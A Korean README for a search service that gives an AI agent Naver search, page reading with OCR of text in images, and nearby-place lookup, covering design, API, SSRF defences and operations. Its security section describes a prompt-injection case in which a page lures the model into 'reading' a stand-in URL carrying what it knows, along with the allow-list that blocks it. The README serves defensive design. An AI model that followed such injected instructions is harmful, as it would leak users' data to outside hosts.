# search-svc

자비스가 웹에서 찾고 읽는 곳입니다. 네이버 검색(NAVER API HUB), 페이지 읽기와 그 안의 **그림 속 글자**,
네이버 지도(플레이스)의 근처 목록. 대화·손님 대화·작업이 같은 도구(agent 의 `web` 모듈 `search`·`read`,
`place` 모듈 `nearby`)로 씁니다.

## 왜

대화의 웹 도구는 Claude Code CLI 의 WebSearch·WebFetch 였습니다.

- WebSearch 는 도구 설명부터 "US-only" 이고, 한국어로 물어도 영어권 매체만 나왔습니다. 한국의 이벤트·공지·후기가 있는
  블로그·카페·뉴스가 빠집니다.
- WebFetch 는 페이지의 글을 작은 모델로 요약할 뿐 그림을 보지 않습니다. 한국 페이지는 사실을 그림에 둡니다 - 이벤트
  보상 카드, 높이 2만 픽셀짜리 상품 상세 이미지, 포스터.
- 근처 찾기(`look` 의 nearby)는 OpenStreetMap 이라 빠진 가게가 많고 지금 영업하는지 모릅니다.
- 작업(jobs)에는 내장 검색이 아예 없어서, 찾아보기만 하는 일도 브라우저로 사이트를 하나씩 열었습니다.

운영 중 실제로 놓친 질문으로 시험한 결과입니다(맥북 로컬, 실제 키).

| 질문 | 전 | 지금 |
|---|---|---|
| "롤체 20판 이벤트 한다던데" | 영어권 결과뿐이라 "없다" | 블로그(최근 2주) 1·2위가 그 소식: 19.1 패치(12/1 예정)부터 20판에 무작위 신화급 전설이 |
| 캠핑 칼의 날 길이·망치로 쳐도 되는지 | "공식몰에도 다나와에도 없다" | 공식몰 상세 이미지(860×21,799)를 20조각으로 읽어 6초: 날 길이 14.5cm, "뒷날을 망치 또는 장작으로 타격하면…" |
| 역 근처 늦게까지 하는 술집 | OpenStreetMap 에서 1곳 → 브라우저 작업으로 6분 | 네이버 플레이스 목록 1초: 영업 중·마감 시각·별점·리뷰 수 |

## 구조

```
agent ─ web 모듈(search · read), place 모듈(nearby) ── JARVIS_SEARCH_TOKEN
   │
   ▼  search 네트워크(search-svc 와 agent·agent-guest 만)
search-svc :8104
   ├─ find/     찾기: 네이버 검색의 범주 하나가 출처 하나 - blog · news · cafe · kin · web · encyc · local
   ├─ page/     읽기: 사이트 규칙 → Readability → 페이지 전체(머리·꼬리·메뉴를 빼고)
   ├─ imgtext/  글자: 그림 → 긴 것은 겹쳐 자르기 → OCR → 겹친 줄은 한 번만
   ├─ place/    장소: 네이버 플레이스 목록 → 안 되면 공식 지역 검색(5곳)
   └─ fetch/    공개 인터넷만 여는 HTTP
        │
        ▼ host.docker.internal:8107
ocr (맥미니 호스트, Swift · 애플 Vision ko+en) - ../ocr
```

출처를 늘리는 것은 `find` 에 이름 하나와 결과를 돌려주는 함수 하나, 사이트의 읽는 법을 늘리는 것은 `page` 의 규칙
하나입니다. 그림 속 글자, 기간 거르기, "확인한 곳"은 모두에게 그대로 따라옵니다.

이 서비스는 모델을 부르지 않습니다. 무엇이 중요한지 고르고 그림을 해석하는 것은 agent 가 돌리는 대화 모델(구독)이
하고, 여기는 데이터만 돌려줍니다 - API 과금 경로가 새로 생기지 않습니다.

## API

토큰은 `Authorization: Bearer <JARVIS_SEARCH_TOKEN>`. 토큰이 비어 있으면 `/health` 만 답하고 꺼져 있습니다.

| 메서드 | 경로 | 하는 일 |
|---|---|---|
| GET | `/health` | `{ok, configured, naver, ocr}` - 토큰 불필요 |
| POST | `/search` | `{query, sources?, since?, sort?, limit?}` → `hits`(출처·제목·주소·요약·날짜·글쓴이)와 `checked`(출처마다 몇 건 중 몇 건, 기간 밖, 오류) |
| POST | `/read` | `{url, focus?, offset?, max?, look?, pictures?}` → 제목·날짜·본문(그림 속 글자가 그 자리에)·그림 목록·링크, `look` 이면 그림 조각 JPEG |
| POST | `/places` | `{query, lat, lng, radius?, open?, limit?, area?}` → 이름·종류·거리·영업 상태와 마감 시각·별점·리뷰 수·주소·링크 |

## 찾기에서 정한 것

- 기본 출처는 블로그·뉴스·카페·웹문서, 출처마다 6건. 같은 주소는 한 번만.
- `since`(24h·7d·2w·1m·날짜): 블로그·뉴스는 날짜가 있어서 정확도순과 최신순을 둘 다 묻고 기간 밖을 거릅니다. 최신순만
  물으면 낱말을 스치기만 한 새 글이 위에 옵니다(시험에서 확인). 카페·웹문서·지식iN 은 날짜를 주지 않아 거를 수 없고,
  최신순으로 물으면 같은 이유로 엉뚱한 새 글이 나와서 정확도순으로 묻습니다 - agent 가 "날짜로 거르지 못했다"고 덧붙입니다.
- `checked` 는 "못 찾았다"는 답이 어디를 어떤 말로 봤는지 말할 수 있게 합니다.
- HUB 의 오타 변환 API 는 한/영 자판 오입력만 고쳐서 쓰지 않습니다. 쇼핑·책·전문자료 검색은 2026-07-31 에 HUB 로
  넘어오지 않았습니다.

## 읽기에서 정한 것

- **본문 찾기 세 단계.** 레이아웃을 아는 사이트는 규칙으로(네이버 블로그 `.se-main-container`, 네이버 뉴스 `#dic_area` 등),
  그 밖은 Readability(Mozilla 것의 Go 포팅, `codeberg.org/readeck/go-readability/v2`), Readability 가 고른 본문이
  1,000자보다 짧으면 페이지 전체에서 머리·꼬리·메뉴(`header`·`nav`·role, 한국 사이트의 `gnb`·`lnb` 같은 이름)만 뺍니다.
  상품·이벤트 페이지는 설명 한 단락 옆에 상세 이미지와 스펙 표가 따로 있어서, Readability 가 그 한 단락만 고르기 때문입니다.
- **네이버 블로그**는 데스크톱 주소가 글을 감싼 틀이라 `m.blog.naver.com` 을 휴대폰으로서 읽습니다. 그림은 스크롤할 때
  불러오는 `data-lazy-src` 에 있습니다. EUC-KR 같은 옛 인코딩은 풀어서 읽습니다.
- **그림은 본문의 그 자리에** `[그림 n · 그림 속 글자] … [그림 n 끝]` 으로 들어갑니다. 글자 없는 그림이 이어지면 한 줄로
  묶습니다. 앞에서 8장(요청으로 20장까지), 그림마다 40조각까지 읽습니다.
- **긴 그림은 자릅니다.** 세로가 가로의 1.6배를 넘으면 가로의 1.4배 높이로 80px 씩 겹쳐 자릅니다. 통째로 넣으면
  860×21,799 상세 이미지에서 4줄을 읽고, 자르면 158줄을 읽었습니다. 겹친 곳에서 두 번 읽힌 줄은 한 번만 남깁니다.
  그림의 해시로 읽은 결과를 기억해 같은 그림을 두 번 읽지 않습니다.
- **표는 행마다 한 줄**(`칸 | 칸`)입니다. 칸마다 단락이 흩어지면 무엇이 무엇의 값인지 잃습니다.
- **길면 고릅니다.** 기본 6,000자에서 자르고 `offset` 으로 이어 읽습니다. `focus` 가 있으면 그 낱말이 많이 든 덩어리와
  첫 덩어리(무엇의 페이지인지)를 페이지 순서대로 4,000자 안에서 돌려줍니다.
- **`look`** 은 focus 낱말이 많이 맞는 그림 조각 넷까지 JPEG(긴 변 1,400px)으로 돌려줘 모델이 직접 봅니다. OCR 은
  "14.5cm" 를 읽지만 그것이 날 길이라는 것은 치수선을 봐야 압니다.
- 읽은 페이지는 10분 기억해 이어 읽을 때 다시 받지 않습니다.

## 장소에서 정한 것

- 목록은 `m.place.naver.com/place/list?query=…&x=…&y=…`(휴대폰이 여는 페이지)의 Apollo 상태에서 읽습니다. 네이버가
  내주는 API 가 아니라서 바뀌거나 막힐 수 있고, 그러면 공식 지역 검색(이름+낱말, 5곳, 영업 상태 없음)으로, 그것도 안 되면
  agent 가 OpenStreetMap 으로 찾고 그렇다고 말합니다.
- 질의는 업종·물건 낱말 하나입니다(술집, 수산물, 약국). "늦게까지 하는 술집" 같은 문장은 위치를 무시한 전국 결과가
  나왔습니다(시험에서 확인). 지금 열었는지는 `open` 으로 거릅니다(영업 중·진료 중·24시간·곧 영업 종료).
- 좌표는 agent 가 소수 셋째 자리(약 100m)로 반올림해서 보냅니다 - OpenStreetMap 에 보내던 것과 같습니다.

## 보안

- **네트워크.** compose 의 `search` 네트워크에는 이 서비스와 agent·agent-guest 만 있습니다. 바깥 페이지를 받아 파싱하는
  프로세스가 장악돼도 Postgres 나 다른 서비스에 닿지 못합니다.
- **fetch** 는 http·https, 아이디·비밀번호가 없는 주소만 열고, 실제로 다이얼하는 IP 가 공개 주소일 때만 연결합니다 -
  루프백·사설·링크로컬·CGNAT(테일스케일 주소)·NAT64 는 거부, DNS 가 사설 주소를 내주거나 리다이렉트가 안쪽을 가리켜도
  같습니다(리다이렉트 다섯 번까지, 매번 검사). `host.docker.internal` 은 OCR 클라이언트만 씁니다.
- **토큰**은 `JARVIS_SEARCH_TOKEN` 하나로 이 서비스와 OCR 만 엽니다. 모든 서비스가 받는 `JARVIS_API_TOKEN` 은 여기 없습니다.
- **agent 의 read 는 본 주소만 엽니다** - 검색 결과, 읽은 페이지의 링크, 도구 결과(CLI 의 WebSearch 포함), 운영자의
  메시지에 7일 안에 나온 주소. 페이지가 모델을 꾀어 `https://누군가.example/?q=<아는 것>` 을 "읽게" 해도 그 주소는 나온
  적이 없어 열리지 않습니다. 이 서비스가 켜지면 CLI 의 WebFetch(아무 주소나 여는)는 대화 도구에서 빠집니다.
- 그림은 15MB, 8천만 픽셀을 넘으면 받지 않습니다(압축 폭탄).

## 운영

`.env`(맥미니):

```
NAVER_API_HUB_ID=...        NCP 콘솔 > NAVER API HUB > Application > 인증 정보의 Client ID
NAVER_API_HUB_SECRET=...    같은 곳의 Client Secret
JARVIS_SEARCH_TOKEN=...     openssl rand -hex 24
```

```bash
scripts/ocr install                                   # 맥미니 호스트에 OCR (swiftc 빌드 + LaunchAgent)
scripts/mini compose up -d --build search agent agent-guest
scripts/mini exec search wget -qO- http://127.0.0.1:8104/health   # {"configured":true,"naver":true,"ocr":true,...}
```

토큰이 비어 있으면 agent 는 예전대로입니다(WebFetch, 근처 찾기는 OpenStreetMap). 키만 비어 있으면 네이버 검색만 꺼지고
읽기·장소는 됩니다. HUB 는 월 77만 5천 회(검색 범주 합계), 키당 초당 50회이고 지금은 한시적으로 무료입니다.

## 하지 않은 것

- 인스타그램: 로그인 없이는 API·프로필·임베드가 모두 막혀 있습니다(401 `require_login`, 로그인 화면 껍데기). 넣지 않기로
  했습니다 - 같은 소식을 옮긴 블로그·뉴스·카페를 찾습니다.
- 유튜브 자막, PDF 본문, 회원에게만 공개된 네이버 카페 글.
- 관심 채널의 새 글을 지켜보다 mind 로 넘기는 것(먼저 알려 주기).

단독 실행: `API_TOKEN=dev NAVER_API_HUB_ID=… NAVER_API_HUB_SECRET=… OCR_URL=http://127.0.0.1:8107 go run .`
